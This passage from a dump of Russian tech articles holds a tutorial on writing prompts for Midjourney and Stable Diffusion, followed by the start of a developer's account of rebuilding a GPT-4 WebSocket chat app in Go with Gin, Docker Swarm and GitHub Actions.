С...","Теперь, когда мы знакомы с теорией, можем взглянуть на практическую часть. Когда дело доходит до практики, важно помнить и знать ключевые принципы, которые помогут вам создавать эффективные промпты.
Сейчас мы рассмотрим различные варианты создания промптов, варианты их улучшения и дополнительные инструменты для повышения эффективности работы с искусственным интеллектом. Надеюсь, что данный материал подарит вам новые идеи и расширит ваш кругозор.
Приятного прочтения!
Синтаксис промптов
Также, вы можете указывать приоритеты, использовать различные конструкции при написании своих промптов. Давайте разбираться, что это и как это можно использовать:
1. Weight
Weight, или же вес — это «важность», которую модель присваивает каждому слову или фразе. Чем больше вес, тем больше приоритет.
Возьмём промпт “beautiful landscape, high mountains, river”, или же на русском: “красивый пейзаж, высокие горы, река”
Для Midjourney будет использоваться ::, но веса работают только для следующих версий: 1, 2, 3, 4, Niji 4, 5, Niji 5, 6, Niji 6 и 6.1, я буду использовать версию 6.1
beautiful landscape, high mountains::2, river::1
Как можете видеть, для гор задаётся наивысший параметр (2), они и выделяются на основном фоне лучше остального.
beautiful landscape, high mountains::1, river::3
Здесь река имеет параметр 3, что делает её наиболее выделяющимся элементом на изображении.
Не везде настройки будут одинаковыми. Например, для Stable Diffusion вес обозначается так: (), [], или же (prompt:значение).
() - увеличивает вес в 1/1.1 раза
[] - уменьшает вес в 1/1.1 раза
beautiful landscape, (((high mountains))), [river]
Горы берутся в тройные скобки ((())), что задаёт им вес 3. Река в одиночных квадратных скобках [], это вес -1. 
beautiful landscape, [[high mountains]], (river:2)
В этом примере у реки параметр 2, горы получают пониженный приоритет. Указывать вес через (prompt:weight) удобнее тем, что не нужно считать скобки, и можно указывать дробные значения.
2. Aspect Ratio
Дословно — соотношение сторон. Этим параметром можно задать размерность вашего изображения.
 Midjourney для этого использует --ar в своих промптах.
Для Stable Diffusion WebUI доступны расширения, например, Aspect Ratio Selector. 
В промптах для DALL-E можно указывать (Aspect Ratio 9:16)
beautiful landscape,high mountains,river --ar 2:3
3. Seed
Параметр --seed — это один из ключевых инструментов для контроля случайности при генерации изображений. Он позволяет воспроизводить результаты и тонко настраивать ваши работы.
Сид имеет значение от 0 до 4294967295, при указании одного сида изображения будут довольно похожими, данный параметр указывает начальную точку генерации изображения. Если не указывать сид, то Midjourney будет выбирать его случайно, чтобы изображения различались даже при одинаковых запросах.
Загадочная ночная поляна с разрушенным, заросшим храмом --seed 123
загадочная ночная поляна с разрушенным, заросшим храмом и светящимися кристаллами --seed 123
Как можете видеть, результаты практически идентичны, во втором промпте я добавил светящиеся кристаллы и получилось аналогичное изображение, но с новой деталью.
4. Negative Prompt
Негативные промты Midjourney — текстовые команды, которые вы можете добавить к исходному промпту. Так вы объясните нейросети то, что вы не хотите видеть в сгенерированном изображении. Негативные промты Midjourney работают путем применения отрицательного веса в отношении нежелательных элементов или указания исключить их, что снижает вероятность их появления на выходе.
Можно использовать негативный промпт двумя способами:
Через параметр --no.
Горный пейзаж --no река
Через отрицательные веса, от -0,5 до -1.
Горный пейзаж, река::-1
Горный пейзаж с заснеженными вершинами
Горный пейзаж с заснеженными вершинами --no река
В первом промпте я указал только горный пейзаж, но нейросеть сгенерировала реку, поэтому через негативный промпт мы убираем её и получаем нужный нам результат.
Каждая модель обладает своей ""личностью"" и подходом к творчеству, поэтому результаты могут сильно отличаться даже при одинаковом промте. Пробуйте разные формулировки, добавляйте больше деталей или изменяйте параметры, чтобы добиться именно того результата, который вам нужен.
В конечном итоге, работа с ИИ — это процесс творческого взаимодействия, где важно адаптироваться к особенностям каждой модели и использовать их сильные стороны для достижения ваших целей.
Варианты создания промптов
Иногда сложно создать нужный, или уникальный промпт, который вам нужен, нет мыслей для новых изображений, всё получается шаблонно.
И вы задаётесь следующим вопросом: “Где ещё черпать идеи для новых запросов, если ничего не лезет в голову?” Сейчас мы с вами рассмотрим некоторые инструменты, которыми можно пользоваться в таких ситуациях.
ChatGPT
Можно просить искусственный интеллект, чтобы он сгенерировал нам промпт. Давайте попросим ChatGPT написать нам промпт для Stable Diffusion.
Вот что из этого вышло:
Летняя поляна в густом лесу, залитая солнечным светом. Мягкая трава и разнообразные полевые цветы покрывают землю, создавая яркий ковер. Вокруг поляны высокие деревья с пышной зелёной листвой, сквозь которую пробиваются солнечные лучи. Легкий ветерок шевелит листья и траву. В центре поляны стоит старое деревянное полено, окруженное порхающими бабочками. Теплая и спокойная атмосфера, вызывающая ощущение уюта и безмятежности. Реалистичный стиль, живописная сцена природы.
Если у вас есть картинка, на основе которой нужно сделать промпт, то ChatGPT тоже может вам в этом помочь. Нужно прикрепить изображение файлом и написать: “Напиши промпт на основе этого изображения”, или что-то подобное.
Я попробовал этот промпт в генерации. Как можете видеть, результат действительно очень схож с оригиналом. Очень удобная функция, когда хочешь повторить изображение, но не знаешь как подойти к написанию промпта.
BotHub
В Bothub есть ещё один вариант создания промптов. Здесь существует множество пресетов для различных ситуаций. Сейчас я покажу вам пресет для создания промптов.
Нажмём сначала на панель, обведенную в кружочек. Далее выбираем “Пресеты”
Здесь вы можете увидеть кучу пресетов и выбрать нужный вам. Я написал в поле поиска “Промпт” и получил множество пресетов к моему запросу. Нажав на кнопку справа сверху, вы можете создать свой собственный пресет.
Также можно попробовать писать “промт/prompt” для получения новых результатов.
Вы также можете настроить здесь категорию и модель
Я попробую этот пресет, он предназначен для ИИ Flux
Вот что я получил на свой запрос “Красивая природа”:
Сначала капсом идёт название промпта, потом уже сам промпт. 
Я попробую использовать первый из этого списка: 
“MAJESTIC MOUNTAIN LANDSCAPE 
breathtaking photorealistic landscape of snow-capped rugged mountains rising dramatically against a vivid blue sky, lush evergreen pine forest covering the lower slopes, crystal-clear alpine lake reflecting the peaks perfectly in its still waters, morning golden sunlight casting long shadows across the valley, small wooden cabin with smoke curling from chimney nestled among trees, distant eagles soaring above peaks, pristine wilderness untouched by civilization, professional nature photography with sharp details and rich colors”
На русском это будет:
“ВЕЛИЧЕСТВЕННЫЙ ГОРНЫЙ ПЕЙЗАЖ 
захватывающий фотореалистичный пейзаж: заснеженные скалистые горы, эффектно возвышающиеся на фоне ярко-голубого неба, пышный вечнозеленый сосновый лес, покрывающий нижние склоны, кристально чистое альпийское озеро, в спокойных водах которого прекрасно отражаются горные вершины, утренний золотистый солнечный свет, отбрасывающий длинные тени на долину, маленькая деревянная хижина с вьющимся из трубы дымом, расположенная среди деревья, далекие орлы, парящие над вершинами гор, девственная природа, не тронутая цивилизацией, профессиональная фотосъемка природы с четкими деталями и насыщенными цветами.”
Хоть ИИ и даёт промпты на английском, в Bothub встроен автоматический переводчик, который все входящие запросы переводит на английский язык.
Если вы тоже хотите использовать этот способ, а также получить доступ ко множеству других нейросетей, то у Bothub есть реферальная ссылка, где после регистрации вам начислят 100 000 внутренней валюты - капсов, которые вы можете потратить на любую нейросеть из довольно обширного списка. 
Настройка ИИ для новых результатов
Здесь же вы можете настроить нужную вам модель искусственного интеллекта. Можно получать разнообразные результаты, меняя параметры у модели. Сейчас я продемонстрирую вам как это работает на примере нейросети Stable Diffusion. 
Для начала нужно зайти в чат, выбрать нейросеть и открыть боковую панель.
В красном кружке будет кнопка “Открыть боковую панель” (Подпись к картинке)
Здесь можно выбрать:
Соотношение сторон: позволяет вам менять ширину и высоту генерируемого изображения.
Негативный промпт: включает текстовую подсказку для исключения определенных объектов или содержимого генерируемого изображения.
Качество: данный параметр определяет качество изображения, которое будет создано.
Сила преследования промпту: контролирует баланс между соблюдением текстовой подсказки и качеством/разнообразием изображения. Чем больше данный параметр, тем ближе изображения к промпту, но может снизиться общее качество картинки.
Шаги: число шагов диффузии, которые будут выполнены. Высокие значения приведут к более долгой генерации, но к более высокому качеству изображений.
Я показал именно настройки Stable Diffusion. Если выбрать другую нейросеть, то настройки будут различаться, от тех, что приведены выше.
Сейчас попробуем поменять параметры и сгенерировать изображения. Генерировать буду на основе данного промпта: “Рыжий кот с густой шерстью, облаченный в маленькую золотую корону с бриллиантами, сидит на краю старинного трона, его зелёные глаза светятся гордостью, фон — мягкий закатный свет, подчеркивающий сияние короны и переливы шерсти.”
Для начала посмотрим, какое изображение нам сгенерирует нейросеть, без изменения настроек:
Например, вот такой будет результат, если выставить максимальную силу следованию промпту.
А вот такой результат при минимальной силе следования промпта.
Для повышения качества изображения, я выставил параметры качество и шаги на максимум и получил такое изображение:
Например, в Midjourney имеются вот такие настройки:
Поменяв различные параметры, Midjourney выдал мне вот такого кота на тот же промпт.
Можете сами зайти и попробовать поменять положение ползунков, выбрать определенный стиль и режим. 
Комбинирование стилей
Для разнообразия ваших генераций, можно смешивать различные стили, добавляя туда детали. Можно попробовать объединить стимпанк с магией, готику и биопанк, античность смешать с хоррором. Идей неограниченное количество, нужно только пробовать.
Дирижабль в стиле стимпанк с латунными механизмами и хрустальными двигателями парит над викторианским городом. На его поверхности выгравированы светящиеся магические руны, испускающие радужный пар. На палубе работают заводные автоматы с глазами из драгоценных камней. Вихри фиолетовой и лазурной магии смешиваются с угольным дымом. Внизу виднеются готические шпили и промышленные трубы. Закатное освещение, проходя через механические крылья, подчеркивает латунные детали.
Древний храм, затерянный в густых джунглях, его классические колонны и статуи покрыты мхом и трещинами. Сквозь разрушенные стены пробивается зловещий красный свет. Статуи древних богов ожили и их лица искажены в ужасных гримасах, в глазах светится потусторонний огонь. Тени на стенах принимают формы мифологических чудовищ, готовых выпрыгнуть из темноты. В воздухе чувствуется тревожный шепот и треск сухих ветвей под невидимыми шагами. 
Постапокалиптический город, где здания сложены из детских игрушек LEGO, а небо выглядит как акварельный закат в стиле Моне. Вдалеке виднеется розовый единорог, летящий на радуге.
Комбинирование стилей позволяет создавать миры, которые существуют на границе реальности и фантазии. Когда наш мозг привыкает к одному стилю, то их комбинирование меняет представление и происходит диссонанс, что делает изображение более запоминающимся. Это также может помочь вам с созданием собственного стиля для своих игр, или каких-либо других произведений. 
Ошибки генерации
При работе с нейросетями для генерации изображений часто возникают типичные ошибки, которые могут снижать качество результата. Возникает это чаще из-за неполноты промпта, но также возможна техническая ограниченность модели. Сейчас мы рассмотрим некоторые ошибки и как с ними бороться. 
Генерация текста
Нейросети плохо справляются с генераций текста на изображениях, потому что у них было мало обучающего материала. Вот алфавит, который сгенерировала мне нейросеть.
Или логотип “История мудрого кота”
Как исправить:
Написать точный промпт: ""Плакат с надписью 'Hello World' крупным шрифтом Arial, чёткий текст, чёрные буквы на белом фоне, минималистичный дизайн"", иногда может помочь.
Исправить текст вручную с помощью графических редакторов.
Использовать gpt-image-1, данная модель хорошо справляется с генерацией текста на изображениях
Анатомические аномалии
Нейросети иногда допускают ошибки в анатомии человека или животных. Это может проявляться в виде лишних/недостающих пальцев, деформированных частей тела или нереалистичных пропорций.
Реальный человек фотографирует себя
Как исправить:
Добавьте детали в промпт: укажите количество пальцев, нормальные пропорции тела и естественную позу.
Используйте негативный промпт: --no лишние пальцы, деформированные черты лица.
Увеличьте параметр CFG Scale (сила следования промпту) для более точного соблюдения запроса.
Искажение текстур
Текстуры объектов могут выглядеть нереалистично, особенно если они сложные (например, мех, волосы или ткань).
Гостиная, панно на всю стену с изображением неба
Как исправить:
Уточните текстуры в промпте: напишите ""мех с мягкими переливами"", ""текстура ткани с естественными складками"".
Используйте высокое разрешение для детализации текстур.
Включите постобработку, чтобы улучшить качество текстур.
Неестественные движения
Движения людей или животных могут выглядеть нелогичными или неестественными.
Человек готовит кофе
Как исправить:
Опишите позу и движения подробно: ""руки держат чашку естественно"", ""движения плавные и реалистичные"".
Увеличьте количество шагов генерации (Steps), чтобы модель лучше обрабатывала детали.
Чтобы минимизировать варианты неверной генерации, для Stable Diffusion есть ControlNet, демо доступна по ссылке, проект есть на гитхабе. 
ControlNet — это мощное расширение для Stable Diffusion, которое позволяет управлять генерацией изображений с помощью различных видов контроля (например, скелетных карт, линий контура, глубины).
Основные возможности ControlNet:
Скелетные карты: Позволяют точно контролировать позы человека или животного.
Контурные карты: Указывают границы объектов, что помогает избежать смазывания или неправильной интерпретации форм.
Глубина поля: Добавляет реалистичный эффект размытия фона, который часто вызывает трудности у нейросетей.
Текстуры: Помогает правильно наложить текстуры на поверхности объектов.
Процесс работы с ControlNet
Загрузка исходного изображения:
Вы загружаете базовое изображение (например, черно-белый контур или скелетную карту).
ControlNet анализирует данное изображение и использует его как основу для генерации.
Применение промпта:
После загрузки изображения вы можете добавить текстовый промпт, описывающий желаемые элементы (например, ""реалистичный портрет человека"").
ControlNet использует информацию из изображения и промпта одновременно, что значительно повышает точность результата.
Настройка параметров:
Можно регулировать силу влияния ControlNet (ControlNet Weight) и другие параметры генерации (например, CFG Scale, Steps).
Результат:
ControlNet гарантирует, что ключевые элементы (поза, форма объектов, текстуры) будут соблюдены, что минимизирует аномалии и залипания.
Данное расширение позволяет максимально контролировать полученный результат.
QoL
QoL — Quality-of-Life, “качество жизни”, это дополнительные инструменты, которые значительно упрощают работу. Они делают взаимодействие с ИИ более удобным, быстрым и эффективным.
Рассмотрим некоторые из них:
PromptHero
PromptHero — это платформа, которая предоставляет доступ к огромной базе готовых промптов, созданных сообществом пользователей. Она особенно полезна тем, кто хочет быстро найти вдохновение или примеры для своих запросов.
Функционал:
Поиск промптов по ключевым словам (например, ""фэнтези"", ""киберпанк"", ""реализм"").
Просмотр результатов генерации, которые были созданы на основе этих промптов.
Возможность адаптировать чужие промпты под свои задачи.
Lexica
Lexica — это мощная поисковая система, которая фокусируется на промптах для Stable Diffusion. Она позволяет находить готовые запросы и изучать результаты их генерации.
Функционал:
Можно осуществить поиск по фото. После загрузки вашего изображения произойдет обратный поиск по вашей картинке и вы получите похожие результаты. 
Прямо на сайте можно генерировать собственные изображения, но для этого требуется подписка.
Также имеется текстовый поиск, большая база промптов и результатов к ним.
Promptomania
Promptomania — это инструмент, который помогает автоматизировать процесс создания промптов. Он предлагает готовые шаблоны и конструкции, которые можно комбинировать для получения уникальных запросов.
Функционал:
Выбор различных нейросетей для генерации.
Выбор изображения для создания промпта на его основе. Также, можно добавить текстовый промпт и создавать массивную конструкцию из изображений и текста.
Есть куча тончайших настроек, которые можно применить для полной настройки вашего промпта.
Также, у них есть библиотека промптов. Не такая большая, как у прошлых, но может кому-то понадобится.
Итог
Надеюсь, вы узнали для себя что-то новое: ранее неизвестные вам техники генерации промптов, или может подцепили новые для себя идеи — это всё может помочь вам в создании своих изображений. 
Главное - проявляйте креативность и экспериментируйте. Чем больше вы пробуете разные подходы, тем лучше понимаете, как добиться именно того результата, который задумали.
А как создаёте промпты вы? Может у вас есть свои способы, которые не были озвучены в данной статье? Прошу поделиться своим опытом в комментариях.
Спасибо за прочтение!"
Как я ушёл с Kotlin (Spring Boot) на Go (Gin) и сделал AI-чат с WebSocket и GPT-4,https://habr.com/ru/articles/910122/,"Меня зовут Артём, я занимаюсь коммерческой разработкой с 2019 года. Последние несколько лет я активно использовал Spring Boot для создания backend-сервисов на Java и Kotlin.
Но в какой-то момент захот...","Меня зовут Артём, я занимаюсь коммерческой разработкой с 2019 года. Последние несколько лет я активно использовал Spring Boot для создания backend-сервисов на Java и Kotlin.
Но в какой-то момент захотелось попробовать что-то новое. Не потому что Spring надоел, а просто чтобы выйти из зоны комфорта и узнать, как чувствует себя проект на другом языке. Я решил: возьму уже начатый pet-проект, перепишу его на Go — и посмотрю, как изменится подход, скорость разработки, ощущения.
Это не туториал «как перепрыгнуть с Kotlin на Go». Это — эксперимент. Расширение границ и проверка своих навыков в новых условиях. Я не пытался доказать, что Go лучше, а просто дал себе возможность попробовать и сравнить.
Фронт у проекта был примитивный, построенный на HTML и JS без фреймворков. Углубляться в TypeScript и вылизывать интерфейсы я не планировал. Я бэкендер, и красить кнопки — точно не цель этого проекта (пока). Главное — чтобы всё работало стабильно, быстро и надёжно.
Так что сделал ставку на знакомые технологии, а всю новизну решил оставить для Go и инфраструктуры.
Заодно добавил интересный вызов: интегрировать GPT-4 через OpenAI API, сделать стриминг в реальном времени через WebSocket и всё это завернуть в CI/CD, который будет деплоить проект без лишних кликов.
Проект я писал около четырёх месяцев, в свободное время — вечерами и по выходным. Местами было сложно, но оно того стоило. В итоге родился полноценный AI-чат с авторизацией, конфигурацией, живыми ответами и гибкой архитектурой.
Важно: дальше в статье будет много текста и деталей. Это не обзор, а скорее история — по шагам и с погружением. Я хотел, чтобы на этом pet-проекте можно было попробовать много технологий, но не в ущерб здравому смыслу. Здесь есть и CI/CD, и WebSocket, и JWT, и взаимодействие с AI. И всё это с упором на:
безопасность,
отказоустойчивость,
асинхронность,
простоту масштабирования,
и, конечно, низкую стоимость эксплуатации.
Статья ориентирована на разработчиков, которые разбираются по чуть-чуть во всём — в backend-е, frontend-е, инфраструктуре и логике систем.
Эта статья — мой первый опыт публикации технического рассказа. И вышла она после майских праздников — символично: ощущаю это как свою маленькую победу.
Вот какие разделы вас ждут и зачем они нужны:
Почему Go + Gin, а не привычный Spring Boot
Разбираю, что подтолкнуло к смене стека и почему именно Go. Пишу честно: без фанатизма и без попытки продать Go как серебряную пулю. Просто сравнение ощущений и опыта.
CI/CD и деплой без кликов: GitHub Actions, Swagger, Docker и Portainer
Автоматизация — одна из главных целей. Я хотел, чтобы после каждого коммита новая версия приложения автоматически попадала на сервер: без SSH, без ручных рестартов и копипасты. В этом разделе расскажу, как получилось выстроить простой и надёжный пайплайн, который сам собирает образ, загружает его на сервер, обновляет прод и при этом ещё и Swagger держит в актуальном состоянии.
Интеграция с GPT-4 и адаптация под пользователя
Сердце проекта — AI. Рассказываю, как устроен prompt, как работают стриминговые ответы, какие параметры можно настроить и как GPT стал частью бизнес-логики. Будет и про фильтрацию, и про планы на мультимодальность (изображения, код и т.д.).
Реальное время: WebSocket, события, непрочитанные
Почему WebSocket, как устроена отправка сообщений и обновление счётчиков. Распишу архитектуру соединений, примеры событий и логику, которая делает чат «живым». Без диких подробностей — просто, понятно и с практическими выводами.
Архитектура проекта: как не перегрузить pet-проект
Разбор слоёв проекта: что за что отвечает, почему отказался от репозиториев. Пишу про GORM, интерфейсы, зависимости и почему важно не усложнять то, что можно сделать просто.
Безопасность: HTTPS, WSS, JWT и защита на всех уровнях
Описываю подход к авторизации, валидации токенов и работе с WebSocket. Зачем HTTPS, почему не ws://, как обрабатываются ошибки, и где можно упасть (но не стоит). Планы на разграничение ролей — тоже здесь.
Трудности разработки: от горутин до фронта
Раздел про грабли. Всё, что не получилось с первого раза: гонки в map, баги с каналами, «висящие» горутины. Как помог GPT-4 не сойти с ума, и почему писать UI без фреймворков — отдельный квест.
Итоги: что получилось, что не успел, и куда двигаться дальше
Заключение. Рефлексия. Что работает, что предстоит сделать. Какие выводы я сделал за эти четыре месяца, и чем хочу вдохновить других разработчиков.
Всё построено по принципу: от кода — к системе, от «почему так?» — к «как это поддерживать?».
Надеюсь, что этот рассказ окажется полезным не только как набор решений, но и как честная история с реальными трудностями, идеями и подходами. Поехали!
Почему Go + Gin, а не Kotlin + Spring Boot?
Первый вопрос, который, скорее всего, возник у многих:
зачем вообще менять проверенный стек?
Я сам долгое время писал на Kotlin с Spring Boot — с его аннотациями, DI, магией и встроенной экосистемой. Это реально удобно. Особенно когда проект большой, а времени — мало.
Но со временем начали ощущаться минусы:
громоздкость проекта даже на старте;
высокое потребление ресурсов;
долгое время запуска;
сложность отладки скрытых процессов (особенно, если не ты их писал).
Хотелось чего-то более простого, явного и быстрого:
лаконичный синтаксис, где почти нет «магии»;
мгновенная компиляция в один бинарник;
эффективная работа с памятью;
встроенная конкурентность (горутины — любовь с первого взгляда).
Я давно хотел подтянуть Go, и вместо учебных задач решил пойти ва-банк — взять живой проект, полностью его переписать, и посмотреть, как изменится разработка. Это был и вызов, и способ быстро прокачать скилл в боевых условиях.
Плюс ко всему, Go просто приятно писать. Ты чувствуешь, что контролируешь происходящее: от старта приложения до каждой строчки бизнес-логики. Это оказалось неожиданно приятно после многослойного Spring-приложения.
CI/CD и эксплуатация: GitHub Actions, Docker Swarm и Portainer
Когда я переписывал проект на Go, одной из целей было — автоматизировать всё, что можно. Хотелось просто писать код, пушить — и чтобы всё остальное происходило без моего участия. Так появилась связка: GitHub Actions + Docker + Portainer.
Что делает CI/CD пайплайн
После каждого пуша в main запускается пайплайн в GitHub Actions, который проходит по нескольким этапам:
Генерация Swagger-документации (OpenAPI)
Использую библиотеку, которая пробегается по Go-контроллерам и моделям, генерируя swagger.yaml.
Документация всегда остаётся актуальной — теперь её не нужно обновлять вручную.
Сборка Docker-образа
Благодаря Go, итоговый бинарник получается лёгким и не требует JVM.
Использую multi-stage Dockerfile:
сначала golang, затем финальный слой на alpine.
Доставка и обновление
Готовый .tar-архив отправляется через scp на сервер,
загружается в локальный Docker Registry (localhost:5000),
а затем выполняется docker service update — и сервис обновляется.
Почему Docker Swarm, а не Kubernetes?
Kubernetes — мощный инструмент, но для одного сервера — перебор.
Я выбрал Docker Swarm, потому что:
он встроен в Docker (не требует отдельной установки);
не нужно писать десятки YAML-файлов;
достаточно одной команды: docker stack deploy.
Если в будущем понадобится Kubernetes — архитектура проекта к этому готова. Миграция будет безболезненной.
Portainer — визуальный контроль и автоматизация
Чтобы не прыгать по ssh и docker ps, я подключил Portainer — лёгкую и удобную веб-панель.
На скриншоте — интерфейс Portainer с минимальным стеком для pet-проекта: ai_chat (бэкенд и фронт в одном сервисе), PostgreSQL для хранения данных и NGINX как SSL-прокси через Let's Encrypt. 
С его помощью можно:
видеть, какие контейнеры запущены и как работают;
быстро перезапускать сервисы;
прокидывать переменные окружения без выхода в консоль;
смотреть логи, даже если под рукой только браузер.
Portainer отлично дополняет CI/CD-процесс и даёт контроль «одним глазом».
Мониторинг и планы на будущее
Пока я полагаюсь на логи (docker logs, Portainer UI) и статусы контейнеров
Но в планах:
подключить Prometheus + Grafana для метрик:
количество WebSocket-соединений;
время отклика от GPT;
загрузка CPU и памяти.
настроить Alertmanager — чтобы оповещения приходили автоматически (Telegram, Email и т.д.).
Что ещё хочется внедрить
нагрузочное тестирование;
CI-пайплайн для фронта и его сборка отдельно от бэка;
отдельные контейнеры для фоновых задач (модерация, чистка логов и др.);
ролевая модель доступа на уровне инфраструктуры.
Вывод
Pet-проекту не нужен Kubernetes — пока. Но если придёт время — я готов.
Проект уже контейнеризирован, CI работает, инфраструктура гибкая.
А пока связка GitHub Actions + Docker Swarm + Portainer даёт всё, что нужно:
быстрое развёртывание;
простое обновление;
уверенность, что всё под контролем.
Интеграция GPT-4: как устроен AI-чат
Когда базовая инфраструктура была готова, я приступил к самому интересному — внедрению AI.
На скриншоте показана статистика использования OpenAI API в проекте ai-chat: выполнено 439 запросов к Chat Completions с общим объёмом 82.7K входных токенов.  
Модель GPT-4 от OpenAI уже тогда казалась чем-то волшебным. Возможность организовать чат, в котором ответы приходят от мощного языкового движка, — звучало как магия. И стало техническим вызовом: как всё это обернуть в потоковое, гибко настраиваемое решение?
Как всё работает внутри
Когда пользователь пишет сообщение, сервер формирует prompt, в который входит:
system message: описание правил — например, ""Ты ассистент в этом приложении, не обсуждай запрещённые темы, отвечай развёрнуто, но сдержанно.""
user message: последнее сообщение пользователя.
Дополнительный контекст: email, настройки, история сообщений.
Этот prompt уходит в OpenAI, а в ответ приходит результат — с учётом всех настроек.
Уже сейчас backend поддерживает передачу email, temperature, depth и даже пользовательские подсказки к каждому чату — всё это настраивается из UI.
Потоковый режим и WebSocket
Сначала я пробовал обычные REST-запросы. Но быстро понял, что хочется ""эффекта живого общения"": чтобы бот печатал ответ в реальном времени, а не присылал всё одним куском.
Для этого я включил режим stream в OpenAI API: модель начинает слать ответ токенами, и можно сразу транслировать их на клиент.
На стороне Go-сервера для каждого подключения запускается горутина, которая читает поток и пересылает данные в WebSocket.
Фронт ловит эти фрагменты и выводит как ""печатающийся"" текст — результат выглядит живо и даже эмоционально. Такое общение цепляет.
Почему не REST?
REST — это хорошо для запросов с мгновенным результатом. Но для AI-ответов в реальном времени он не подходит:
нельзя ""частями"" возвращать текст;
frontend не может показать постепенное появление символов;
пользователь не понимает, работает ли бот или ""завис"".
С WebSocket всё иначе: соединение живое, и каждый токен от GPT немедленно уходит клиенту. И именно это делает чат ""живым"".
Настройки для гибкости
Пользователь может сам выбрать:
temperature — насколько креативным будет AI;
depth — сколько сообщений учитывать в истории;
дополнительный контекст — например, ""ты общаешься с клиентом по вопросам доставки"".
Скриншот показывает реализацию потоковой генерации ответа от GPT через OpenAI API в Go: формируется POST-запрос с флагом stream: true, авторизация идёт по API-ключу, а результат передаётся по чанкам в обработчик.  
Это уже реализовано в настройках чата, и сохраняется в базе для каждого пользователя.
Фильтрация и адаптация
Иногда GPT может вернуть что-то вроде:
{ ""chat_id"": ""123"", ""user_id"": ""456"" }
Это технический ответ, который не имеет смысла для обычного пользователя.
Поэтому я реализовал адаптер, который:
фильтрует ""пустые"" JSON-ответы;
добавляет system-сообщения вроде: ""В чате участвует user@example.com"", чтобы AI понимал контекст;
проверяет стиль общения — например, избегает неприемлемых тем.
На скриншоте показан адаптер, подготавливающий сообщения для GPT: слева — логика фильтрации, добавления email и генерации prompt, справа — системные инструкции (system prompts), автоматически добавляемые в начало переписки. Такой подход помогает модели лучше ориентироваться в диалоге, персонализировать ответы и соблюдать правила поведения в чате.  
Покупатель пишет продавцу
У продавца появилась подсказка
Планы по AI: дальше — больше
Уже сейчас GPT-4 — ядро всей интеллектуальной логики приложения. Но хочется пойти дальше:
Подключить другие модели для задач: GPT-4o, Vision, Whisper (голос), парсинг изображений.
Обработка вложений: например, пользователь присылает фото, а модель анализирует его и формирует ответ.
Настроить бизнес-роли: консультант, продавец, помощник поддержки — чтобы ответы были не просто текстом, а соответствовали цели чата.
Добавить параметры вроде max_tokens, stop_sequence, интеграцию с внешними источниками — например, чтобы бот ""смотрел в интернет"" при необходимости.
Работая над этим модулем, я понял главное: AI — это не ""просто ответ"", это диалог, который можно настраивать и развивать. И это, честно, затягивает.
Реальное время на WebSocket: события и непрочитанное
Когда появилась первая интеграция с AI, стало ясно: чтобы чат был по-настоящему живым, нужно уходить от классического подхода с REST-запросами.
Пользователь не должен ждать, пока кто-то нажмёт F5. Он должен сразу видеть новое сообщение, обновлённый счётчик, или приход уведомления.
Так в проекте появился WebSocket — и с ним, по сути, вторая жизнь приложения.
Почему именно WebSocket?
У REST есть альтернатива — long polling или SSE (Server-Sent Events), но у всех них есть ограничения:
REST — хорош для запроса и ответа, но не годится для ""пуша"" от сервера;
polling грузит сервер и не даёт мгновенности;
SSE работает в одну сторону (только сервер → клиент).
А WebSocket — это полноценное двустороннее соединение:
сервер может слать данные в любой момент;
клиент может слушать и отправлять одновременно;
всё это работает поверх одного TCP-соединения — эффективно и быстро.
Какие события мы отправляем?
Сервер в любой момент может прислать:
chat_message — новое сообщение в чате;
notification — событие вроде ""тебя добавили в друзья"";
unread_count — обновление количества непрочитанных.
Каждое событие имеет свой формат, чтобы клиент понимал, как его обработать. Например, chat_message содержит ID чата, отправителя и текст.
Архитектура соединений внутри
Когда клиент подключается к WebSocket:
Он передаёт JWT (через query или заголовок).
Сервер валидирует токен.
Создаётся Session: WebSocket + userId + список чатов.
Session кладётся в map[userId]Session.
С этой map работают горутины через каналы, чтобы не было гонок и проблем с конкурентностью.
Как работает рассылка
Допустим, пользователь отправляет сообщение в чат:
оно сохраняется в базу данных;
формируется событие chat_message;
сервер ищет всех участников чата;
у кого открыт WebSocket — тем сразу отправляется сообщение;
если пользователь офлайн — сообщение считается непрочитанным.
Подсчёт непрочитанных
У каждого пользователя:
в базе хранится количество непрочитанных сообщений;
в памяти есть актуальные данные для быстрого доступа;
в UI — отображается badge со счётчиком.
Когда пользователь открывает чат:
счётчик сбрасывается;
отправляется событие unread_count, чтобы UI обновился.
Работа уведомлений в реальном времени
Пример обработки в реальном времени
У каждого пользователя есть своя горутина и канал сообщений:
type Session struct {
    conn *websocket.Conn
    send chan Event
}
Сервер пишет события в канал, а воркер читает их и шлёт в WebSocket.
Так можно безопасно и быстро отправлять сообщения, не блокируя основную логику.
Что ещё работает через WebSocket
Ответы от GPT — прямо по мере генерации;
Уведомления — новые друзья, приглашения;
Ошибки — если что-то пошло не так, клиент узнаёт мгновенно;
Статусы — кто в онлайне, кто набирает текст (в планах).
Это изображение демонстрирует структуру проекта на Go и фрагмент ключевой функции ProcessStreamingResponse, отвечающей за обработку потоковых AI-ответов от OpenAI в реальном времени. Слева — структура проекта с модулями, а справа — код, который читает входящий поток построчно, парсит JSON-чанки и передаёт их в WebSocket-клиент. Этот механизм лежит в основе стриминга ответов от GPT-4, обеспечивая эффект «печатающегося» текста прямо в чате.  
В результате чат стал ощущаться живым. Нет задержек, нет пустых экранов, нет ощущения ""ничего не происходит"".
И всё это — на одном компактном соединении. Легко, быстро и эффективно.
А главное — архитектура уже сейчас позволяет масштабировать систему: новые события, новые типы соединений, разделение каналов по тематикам — всё можно добавить без боли.
Архитектура проекта: минимум слоёв, максимум простоты
Переписывая проект на Go, я не стал изобретать архитектуру с нуля. Вместо этого — взял лучшее из привычного мира Spring и адаптировал к философии Go.
Результат получился простым, но мощным — как раз то, что нужно для быстрого старта и лёгкого развития.
📁 Структура проекта
Я разбил код по директориям:
routes — настройка маршрутов и привязка к обработчикам;
controllers — обработка запросов, валидация, вызов сервисов;
services — бизнес-логика, работа с БД, GPT и т.д.;
models — все структуры: модели БД, DTO и вспомогательные типы.
Такой подход делает проект понятным с первого взгляда.
Заходишь в services — и сразу видишь, где живёт основная логика. Всё читаемо и без лишней ""магии"".
Почему я отказался от репозиториев
В Java-мире я привык к схеме controller → service → repository. Но в Go она не всегда нужна.
Вот мои причины отказаться от repository:
GORM уже предоставляет удобные методы: db.First, db.Where, db.Create — и так далее;
Интерфейсы Go и так дают нужную гибкость для тестов;
Чем меньше абстракций — тем проще и быстрее писать код.
